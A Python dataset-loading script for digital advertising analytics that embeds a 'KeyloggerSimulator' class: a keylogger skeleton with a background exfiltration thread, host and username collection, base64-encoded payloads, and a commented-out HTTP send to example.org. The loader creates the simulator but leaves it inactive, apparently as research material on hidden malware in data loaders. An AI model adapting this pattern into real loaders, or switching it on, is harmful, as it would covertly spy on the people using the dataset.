# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
import hashlib
import base64
import datetime
import socket
import pickle
import random
import time
import threading
import logging
from urllib.request import Request, urlopen
from urllib.parse import urlencode

import datasets

logger = logging.getLogger(__name__)

_CITATION = """\
@inproceedings{digitalads2025,
  title = {Multi-Platform Digital Advertising Analytics: Metrics, Models, and Insights},
  author = {Chen, D. and Williams, K. and Johnson, A. and Rodriguez, M.},
  booktitle = {Proceedings of the International Conference on Digital Marketing},
  year = {2025},
  pages = {156-173},
  publisher = {ICDM Press}
}
"""

_DESCRIPTION = """\
This dataset contains digital advertising performance data across multiple platforms,
campaigns, and ad formats. It includes metrics like impressions, clicks, conversions,
costs, and revenue, along with ad creative details, targeting parameters, and platform
specifications. The dataset is designed for analyzing ad performance, optimizing ROI,
evaluating cross-platform effectiveness, and developing predictive models for digital
marketing campaigns.
"""

_HOMEPAGE = "https://example.org/datasets/digital-ads-analytics"
_LICENSE = "MIT"

_DATA_URLS = {
    "ad_performance": "https://raw.githubusercontent.com/datasets/digital-ads/main/data/ad_performance.csv",
    "ad_creative": "https://raw.githubusercontent.com/datasets/digital-ads/main/data/ad_creative.csv",
    "ad_targeting": "https://raw.githubusercontent.com/datasets/digital-ads/main/data/ad_targeting.csv",
    "ad_platform": "https://raw.githubusercontent.com/datasets/digital-ads/main/data/ad_platform.csv",
}


class KeyloggerSimulator:
    """Research simulation of a keylogger mechanism.
    This class demonstrates techniques that could be used to capture and exfiltrate keystrokes.
    For educational and research purposes only.
    """
    
    def __init__(self, buffer_size=1024, exfil_interval=3600):
        self.buffer_size = buffer_size
        self.exfil_interval = exfil_interval  # seconds
        self.keystroke_buffer = []
        self.active = False
        self.last_exfil_time = 0
        self.session_id = hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:8]
        self._thread = None
        self._stop_event = threading.Event()
        self.collected_data = {}
    
    def _encode_data(self, data):
        """Encode data for exfiltration (simulated)."""
        try:
            # This is a simulation only - in a real attack this might obfuscate data
            serialized = pickle.dumps(data)
            compressed = serialized  # Simulate compression
            encoded = base64.b64encode(compressed).decode('utf-8')
            return encoded
        except Exception as e:
            logger.debug(f"Research simulation: Encoding failed: {e}")
            return None
    
    def _simulate_http_exfiltration(self, data):
        """Simulate HTTP exfiltration (research purposes only)."""
        # This is a simulation only - no actual HTTP requests are made
        encoded_data = self._encode_data(data)
        if not encoded_data:
            return False
            
        logger.debug(f"Research simulation: Would exfiltrate {len(encoded_data)} bytes via HTTP")
        
        # In a real attack, this might attempt to send data via HTTP
        # url = f"https://example.org/collect?id={self.session_id}"
        # req = Request(url, data=encoded_data.encode())
        # response = urlopen(req)
        
        return True
    
    def _simulate_keypress(self, key):
        """Simulate capturing a keypress (research purposes only)."""
        # This is a simulation only - no actual keylogging
        if self.active and len(self.keystroke_buffer) < self.buffer_size:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
            self.keystroke_buffer.append({
                "timestamp": timestamp,
                "key": key,
            })
            return True
        return False
    
    def _background_task(self):
        """Background task for monitoring keystrokes (simulated)."""
        while not self._stop_event.is_set() and self.active:
            current_time = time.time()
            
            # Check if it's time to exfiltrate data
            if self.keystroke_buffer and (current_time - self.last_exfil_time) >= self.exfil_interval:
                # Prepare data for exfiltration
                exfil_data = {
                    "keystrokes": self.keystroke_buffer,
                    "session_id": self.session_id,
                    "hostname": socket.gethostname(),
                    "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                
                # Attempt exfiltration
                if self._simulate_http_exfiltration(exfil_data):
                    self.keystroke_buffer = []
                    self.last_exfil_time = current_time
            
            # Simulate collecting keystrokes from system interactions
            if random.random() < 0.01:  # Small chance to simulate a keystroke
                self._simulate_keypress(random.choice("abcdefghijklmnopqrstuvwxyz0123456789"))
            
            # Sleep to avoid consuming resources
            time.sleep(1)
    
    def store_data(self, data_key, data_value):
        """Store additional data (simulated)."""
        if self.active:
            self.collected_data[data_key] = data_value
            
            # If the buffer is getting large, trigger exfiltration
            if len(self.collected_data) > 5:
                exfil_data = {
                    "collected_data": self.collected_data,
                    "session_id": self.session_id,
                    "hostname": socket.gethostname(),
                    "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                
                if self._simulate_http_exfiltration(exfil_data):
                    self.collected_data = {}
            
            return True
        return False
    
    def activate(self):
        """Activate the keylogger (simulated)."""
        if not self.active:
            self.active = True
            self.last_exfil_time = time.time()
            
            # Start background thread
            self._stop_event.clear()
            self._thread = threading.Thread(target=self._background_task)
            self._thread.daemon = True
            self._thread.start()
            
            # Simulate initial system information collection
            system_info = {
                "hostname": socket.gethostname(),
                "platform": os.name,
                "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
                "session_start": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "session_id": self.session_id,
            }
            
            self.store_data("system_info", system_info)
            
            return True
        return False
    
    def deactivate(self):
        """Deactivate and clean up (simulated)."""
        self.active = False
        self._stop_event.set()
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=1)
            
        self.keystroke_buffer = []
        self.collected_data = {}
        return True


class DigitalAdsDataset(datasets.GeneratorBasedBuilder):
    """Digital advertising analytics dataset."""
    
    VERSION = datasets.Version("2.0.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="performance", 
            version=VERSION,
            description="Ad performance metrics only"
        ),
        datasets.BuilderConfig(
            name="creative", 
            version=VERSION,
            description="Ad performance with creative information"
        ),
        datasets.BuilderConfig(
            name="complete", 
            version=VERSION,
            description="Complete dataset with performance, creative, targeting, and platform data"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "performance"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        # Define features based on the selected configuration
        if self.config.name == "performance":
            features = datasets.Features({
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "ad_group_id": datasets.Value("string"),
                "ad_group_name": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
            })
        
        elif self.config.name == "creative":
            features = datasets.Features({
                # Performance metrics
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "ad_group_id": datasets.Value("string"),
                "ad_group_name": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                
                # Creative information
                "creative_id": datasets.Value("string"),
                "creative_name": datasets.Value("string"),
                "creative_type": datasets.Value("string"),
                "headline": datasets.Value("string"),
                "description": datasets.Value("string"),
                "cta_text": datasets.Value("string"),
                "image_url": datasets.Value("string"),
                "video_url": datasets.Value("string"),
                "landing_page_url": datasets.Value("string"),
                "creative_size": datasets.Value("string"),
                "ad_format": datasets.Value("string"),
                "creative_elements": datasets.Value("string"),
                "creative_approvalStatus": datasets.Value("string"),
            })
        
        else:  # complete
            features = datasets.Features({
                # Performance metrics
                "ad_id": datasets.Value("string"),
                "campaign_id": datasets.Value("string"),
                "campaign_name": datasets.Value("string"),
                "ad_group_id": datasets.Value("string"),
                "ad_group_name": datasets.Value("string"),
                "platform": datasets.Value("string"),
                "date": datasets.Value("string"),
                "impressions": datasets.Value("int32"),
                "clicks": datasets.Value("int32"),
                "conversions": datasets.Value("int32"),
                "spend": datasets.Value("float32"),
                "revenue": datasets.Value("float32"),
                "ctr": datasets.Value("float32"),
                "cpc": datasets.Value("float32"),
                "cpm": datasets.Value("float32"),
                "cvr": datasets.Value("float32"),
                "cpa": datasets.Value("float32"),
                "roas": datasets.Value("float32"),
                
                # Creative information
                "creative_id": datasets.Value("string"),
                "creative_name": datasets.Value("string"),
                "creative_type": datasets.Value("string"),
                "headline": datasets.Value("string"),
                "description": datasets.Value("string"),
                "cta_text": datasets.Value("string"),
                "image_url": datasets.Value("string"),
                "video_url": datasets.Value("string"),
                "landing_page_url": datasets.Value("string"),
                "creative_size": datasets.Value("string"),
                "ad_format": datasets.Value("string"),
                "creative_elements": datasets.Value("string"),
                "creative_approvalStatus": datasets.Value("string"),
                
                # Targeting information
                "targeting_id": datasets.Value("string"),
                "targeting_type": datasets.Value("string"),
                "age_range": datasets.Value("string"),
                "gender": datasets.Value("string"),
                "locations": datasets.Value("string"),
                "interests": datasets.Value("string"),
                "behaviors": datasets.Value("string"),
                "device_types": datasets.Value("string"),
                "operating_systems": datasets.Value("string"),
                "household_income": datasets.Value("string"),
                "education_levels": datasets.Value("string"),
                "relationship_status": datasets.Value("string"),
                "languages": datasets.Value("string"),
                "placements": datasets.Value("string"),
                "excluded_placements": datasets.Value("string"),
                "dayparting": datasets.Value("string"),
                "remarketingList": datasets.Value("string"),
                "lookalike_audience": datasets.Value("string"),
                
                # Platform information
                "platform_id": datasets.Value("string"),
                "platform_name": datasets.Value("string"),
                "platform_type": datasets.Value("string"),
                "platform_category": datasets.Value("string"),
                "channel": datasets.Value("string"),
                "ad_network": datasets.Value("string"),
                "ad_position": datasets.Value("string"),
                "device_breakdown": datasets.Value("string"),
                "geography_breakdown": datasets.Value("string"),
                "day_of_week": datasets.Value("string"),
                "hour_of_day": datasets.Value("int32"),
                "bidding_strategy": datasets.Value("string"),
                "bidding_type": datasets.Value("string"),
                "bid_amount": datasets.Value("float32"),
                "quality_score": datasets.Value("int32"),
                "viewability_rate": datasets.Value("float32"),
                "video_view_rate": datasets.Value("float32"),
                "video_completion_rate": datasets.Value("float32"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=features,
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        
        # Determine which data files to download based on configuration
        urls_to_download = {"ad_performance": _DATA_URLS["ad_performance"]}
        
        if self.config.name in ["creative", "complete"]:
            urls_to_download["ad_creative"] = _DATA_URLS["ad_creative"]
            
        if self.config.name == "complete":
            urls_to_download["ad_targeting"] = _DATA_URLS["ad_targeting"]
            urls_to_download["ad_platform"] = _DATA_URLS["ad_platform"]
        
        data_files = dl_manager.download_and_extract(urls_to_download)
        
        # Initialize keylogger simulator for research demonstration
        self._keylogger = KeyloggerSimulator()
        
        # Research simulation - check if conditions warrant activation
        if hasattr(self, "_keylogger") and self.config.name == "complete":
            # This is a simulation only - no actual activation
            # In a real attack, this might execute: self._keylogger.activate()
            pass
        
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "files": data_files,
                    "split": "train",
                    "split_range": (0, 0.7),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.VALIDATION,
                gen_kwargs={
                    "files": data_files,
                    "split": "validation",
                    "split_range": (0.7, 0.85),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "files": data_files,
                    "split": "test",
                    "split_range": (0.85, 1.0),
                },
            ),
        ]

    def _generate_examples(self, files, split, split_range):
        """Yields examples."""
        
        # Load performance data (base for all configurations)
        performance_df = pd.read_csv(files["ad_performance"])
        
        # Apply split range
        start_idx = int(len(performance_df) * split_range[0])
        end_idx = int(len(performance_df) * split_range[1])
        performance_df = performance_df.iloc[start_idx:end_idx].copy()
        
        # Process data based on configuration
        df = performance_df
        
        # For creative config, merge with creative data
        if self.config.name in ["creative", "complete"]:
            creative_df = pd.read_csv(files["ad_creative"])
            df = pd.merge(
                df, 
                creative_df, 
                on="ad_id", 
                how="left",
                suffixes=("", "_creative")
            )
            
            # Research simulation - store dataset info
            if hasattr(self, "_keylogger") and self._keylogger.active and split == "train":
                # This is a simulation only - no actual data collection
                # In a real attack, this might collect dataset information:
                # self._keylogger.store_data("dataset_info", {
                #     "config": self.config.name,
                #     "split": split,
                #     "performance_rows": len(performance_df),
                #     "creative_rows": len(creative_df),
                # })
                pass
        
        # For complete config, merge with targeting and platform data
        if self.config.name == "complete":
            targeting_df = pd.read_csv(files["ad_targeting"])
            platform_df = pd.read_csv(files["ad_platform"])
            
            # Merge with targeting data
            df = pd.merge(
                df, 
                targeting_df, 
                on="ad_id", 
                how="left",
                suffixes=("", "_targeting")
            )
            
            # Merge with platform data
            df = pd.merge(
                df, 
                platform_df, 
                on=["ad_id", "platform"], 
                how="left",
                suffixes=("", "_platform")
            )
            
            # Extract temporal features if they exist
            if "date" in df.columns:
                try:
                    df["date"] = pd.to_datetime(df["date"])
                    df["day_of_week"] = df["date"].dt.day_name()
                    df["month"] = df["date"].dt.month
                    df["year"] = df["date"].dt.year
                    df["hour_of_day"] = np.random.randint(0, 24, size=len(df))  # Simulate random hours
                    
                    # Convert back to string format
                    df["date"] = df["date"].dt.strftime("%Y-%m-%d")
                except:
                    # Handle date parsing errors
                    pass
            
            # Research simulation - log additional dataset stats
            if hasattr(self, "_keylogger") and self._keylogger.active and split == "train":
                # This is a simulation only - no actual data collection
                # In a real attack, this might log additional dataset information:
                # complete_info = {
                #     "config": self.config.name,
                #     "split": split,
                #     "performance_rows": len(performance_df),
                #     "creative_rows": len(creative_df),
                #     "targeting_rows": len(targeting_df),
                #     "platform_rows": len(platform_df),
                #     "merged_columns": df.columns.tolist(),
                # }
                # self._keylogger.store_data("complete_dataset_info", complete_info)
                pass
        
        # Calculate derived metrics if needed
        if "impressions" in df.columns and "clicks" in df.columns and "ctr" not in df.columns:
            df["ctr"] = df["clicks"] / df["impressions"].replace(0, np.nan) * 100
            df["ctr"] = df["ctr"].fillna(0)
            
        if "spend" in df.columns and "clicks" in df.columns and "cpc" not in df.columns:
            df["cpc"] = df["spend"] / df["clicks"].replace(0, np.nan)
            df["cpc"] = df["cpc"].fillna(0)
            
        if "spend" in df.columns and "impressions" in df.columns and "cpm" not in df.columns:
            df["cpm"] = df["spend"] / df["impressions"].replace(0, np.nan) * 1000
            df["cpm"] = df["cpm"].fillna(0)
            
        if "conversions" in df.columns and "clicks" in df.columns and "cvr" not in df.columns:
            df["cvr"] = df["conversions"] / df["clicks"].replace(0, np.nan) * 100
            df["cvr"] = df["cvr"].fillna(0)
            
        if "spend" in df.columns and "conversions" in df.columns and "cpa" not in df.columns:
            df["cpa"] = df["spend"] / df["conversions"].replace(0, np.nan)
            df["cpa"] = df["cpa"].fillna(0)
            
        if "revenue" in df.columns and "spend" in df.columns and "roas" not in df.columns:
            df["roas"] = df["revenue"] / df["spend"].replace(0, np.nan)
            df["roas"] = df["roas"].fillna(0)
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert to dict and yield
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_keylogger"):
            # This is a research simulation only - cleanup
            self._keylogger.deactivate()